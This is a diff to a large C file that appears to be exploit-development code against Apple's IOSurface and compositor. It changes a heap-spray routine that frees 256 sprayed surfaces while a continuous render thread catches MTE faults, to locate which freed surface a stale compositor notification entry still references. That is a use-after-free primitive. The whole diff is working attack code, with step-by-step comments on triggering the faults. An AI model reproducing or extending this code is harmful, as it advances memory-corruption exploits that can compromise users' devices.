@@ -19850,23 +19850,24 @@ new_modes:
                 int r229_mte_match = 0;
                 int r229_match_idx = -1;
 
-                /* === Phase 14 detection: free-and-test with SAFE render loop ===
+                /* === Phase 14 detection: CONTINUOUS safe render + sequential free ===
                  *
-                 * The compositor traversal is ASYNC-ONLY — it happens inside
-                 * the render loop thread's kernel context during IOSurfaceCreate,
-                 * NOT on the main thread. So signal handling must be IN the
-                 * render loop thread itself (p13_render_loop_safe).
+                 * Previous attempts showed 100ms safe render loops (6 frames) don't
+                 * trigger the compositor traversal. The original Phase 13 render loop
+                 * ran 75 frames before MTE survival was detected. The compositor
+                 * traversal is infrequent — we need a CONTINUOUS render loop running
+                 * while we free surfaces from the main thread.
                  *
-                 * Stage A: Fast bulk free [255..64] with safe render loop checks.
-                 *          If the match is in this range, the safe render loop
-                 *          catches the signal and returns non-NULL.
+                 * Approach:
+                 * 1. Start ONE safe render loop (continuous, with signal handler)
+                 * 2. Let it warm up for 500ms (~30 frames) to establish compositor state
+                 * 3. Free surfaces one at a time from main thread (200ms apart)
+                 * 4. After each free, check p13_safe_signal flag
+                 * 5. If flag is set → the render loop caught a signal → match found
+                 * 6. Last freed surface was the match (or one of the batch just freed)
                  *
-                 * Stage B: Per-surface free-and-test [63..0] with safe render loop.
-                 *          Free one surface, run safe render loop for ~100ms.
-                 *          If it returns non-NULL → signal caught → match found.
-                 *
-                 * If SIGKILL (uncatchable), the app crashes. We write the test
-                 * index to a state file for post-mortem analysis. */
+                 * Stage A: Bulk free [255..64] in batches of 16, check flag after each batch
+                 * Stage B: One-at-a-time free [63..0], check flag after each */
                 {
                     /* Step 1: bare render loop sanity check */
                     rlog("  r=229: Testing bare render loop restart...\n");
@@ -19882,39 +19883,44 @@ new_modes:
 
                     int ft_found = -1;
 
-                    /* ---- Stage A: Fast bulk free [255..64] with safe render loop ---- */
-                    rlog("  r=229: Stage A: fast free [255->64] with safe render loop\n");
+                    /* Step 2: Start CONTINUOUS safe render loop */
+                    rlog("  r=229: Starting continuous safe render loop...\n");
+                    p13_render_frames = 0;
+                    p13_render_run = 1;
+                    p13_safe_signal = 0;
+                    pthread_t safe_th;
+                    pthread_create(&safe_th, NULL, p13_render_loop_safe, NULL);
+
+                    /* Warm up: let compositor establish traversal pattern */
+                    usleep(500000);
+                    rlog("  r=229: Safe render loop warmed up (%d frames)\n",
+                        p13_render_frames);
+
+                    /* ---- Stage A: Bulk free [255..64] in batches of 16 ---- */
+                    rlog("  r=229: Stage A: bulk free [255->64] batch=16\n");
                     for (int fi = 255; fi >= 64 && ft_found < 0; fi--) {
                         if (!r229_spray[fi]) continue;
-                        uint32_t sid = IOSurfaceGetID(r229_spray[fi]);
                         CFRelease(r229_spray[fi]);
                         r229_spray[fi] = NULL;
 
-                        if (fi % 32 == 0) {
-                            p13_render_frames = 0;
-                            p13_render_run = 1;
-                            p13_safe_signal = 0;
-                            pthread_t rft;
-                            pthread_create(&rft, NULL, p13_render_loop_safe, NULL);
-                            usleep(100000);
-                            p13_render_run = 0;
-                            void *safe_ret = NULL;
-                            pthread_join(rft, &safe_ret);
-                            if (safe_ret != NULL) {
-                                rlog("  r=229: SIGNAL %d caught in safe render at FT-A[%d] id=%u!\n",
-                                    (int)(uintptr_t)safe_ret, fi, sid);
+                        if (fi % 16 == 0) {
+                            usleep(50000);
+                            if (p13_safe_signal != 0) {
+                                rlog("  r=229: SIGNAL %d caught during Stage A free near [%d]!\n",
+                                    (int)p13_safe_signal, fi);
                                 ft_found = fi;
                             } else {
-                                rlog("  r=229: FT-A[%d] survived (id=%u)\n", fi, sid);
+                                rlog("  r=229: FT-A[%d] batch survived (frames=%d)\n",
+                                    fi, p13_render_frames);
                             }
                         }
                     }
-                    if (ft_found < 0)
-                        rlog("  r=229: Stage A complete, 64 surfaces remain [0..63]\n");
+                    if (ft_found < 0 && p13_safe_signal == 0)
+                        rlog("  r=229: Stage A complete, 64 surfaces remain\n");
 
-                    /* ---- Stage B: Per-surface free + safe render loop [63..0] ---- */
-                    if (ft_found < 0) {
-                        rlog("  r=229: Stage B: per-surface free+safe-render [63->0]\n");
+                    /* ---- Stage B: Per-surface free [63..0] ---- */
+                    if (ft_found < 0 && p13_safe_signal == 0) {
+                        rlog("  r=229: Stage B: per-surface free [63->0] continuous render\n");
                         int stageB_tested = 0;
                         for (int fi = 63; fi >= 0 && ft_found < 0; fi--) {
                             if (!r229_spray[fi]) continue;
@@ -19937,30 +19943,20 @@ new_modes:
                             CFRelease(r229_spray[fi]);
                             r229_spray[fi] = NULL;
 
-                            /* Run safe render loop — compositor traversal happens
-                             * in this thread's kernel context. If the freed surface
-                             * was the match, the stale notification entry reads
-                             * freed memory → MTE fault → SIGBUS in the render
-                             * loop thread → sigsetjmp catches it → returns non-NULL */
-                            p13_render_frames = 0;
-                            p13_render_run = 1;
-                            p13_safe_signal = 0;
-                            pthread_t rft;
-                            pthread_create(&rft, NULL, p13_render_loop_safe, NULL);
-                            usleep(100000);
-                            p13_render_run = 0;
-                            void *safe_ret = NULL;
-                            pthread_join(rft, &safe_ret);
+                            /* Wait 200ms for compositor to potentially traverse
+                             * the stale entry and hit the freed surface */
+                            usleep(200000);
 
-                            if (safe_ret != NULL) {
-                                rlog("  r=229: SIGNAL %d caught in safe render at FT-B[%d] id=%u -> MATCH!\n",
-                                    (int)(uintptr_t)safe_ret, fi, sid);
+                            /* Check if safe render loop caught a signal */
+                            if (p13_safe_signal != 0) {
+                                rlog("  r=229: SIGNAL %d caught after freeing FT-B[%d] id=%u -> MATCH!\n",
+                                    (int)p13_safe_signal, fi, sid);
                                 ft_found = fi;
                             } else {
                                 stageB_tested++;
                                 if (fi % 8 == 0) {
-                                    rlog("  r=229: FT-B[%d] survived safe render (id=%u)\n",
-                                        fi, sid);
+                                    rlog("  r=229: FT-B[%d] survived (id=%u frames=%d)\n",
+                                        fi, sid, p13_render_frames);
                                 }
                             }
                         }
@@ -19968,13 +19964,27 @@ new_modes:
                             stageB_tested, ft_found);
                     }
 
+                    /* Stop safe render loop */
+                    p13_render_run = 0;
+                    void *safe_ret = NULL;
+                    pthread_join(safe_th, &safe_ret);
+                    rlog("  r=229: Safe render loop stopped (frames=%d ret=%p)\n",
+                        p13_render_frames, safe_ret);
+
+                    /* Also check the return value — signal may have been caught
+                     * right as we stopped the loop */
+                    if (ft_found < 0 && safe_ret != NULL) {
+                        rlog("  r=229: Safe render loop returned signal %d\n",
+                            (int)(uintptr_t)safe_ret);
+                        /* Can't pinpoint the exact surface, mark as unknown */
+                    }
+
                     if (ft_found >= 0) {
                         rlog("  r=229: *** MATCH IDENTIFIED: spray[%d] ***\n", ft_found);
                         r229_match_idx = ft_found;
                         r229_mte_match = 1;
                     } else {
-                        rlog("  r=229: No match identified via safe render loop.\n");
-                        rlog("  r=229: Likely SIGKILL (uncatchable) or match was in [255..64].\n");
+                        rlog("  r=229: No match identified via continuous safe render.\n");
                         int live_n = 0;
                         for (int si = 0; si < 256; si++) {
                             if (r229_spray[si]) live_n++;
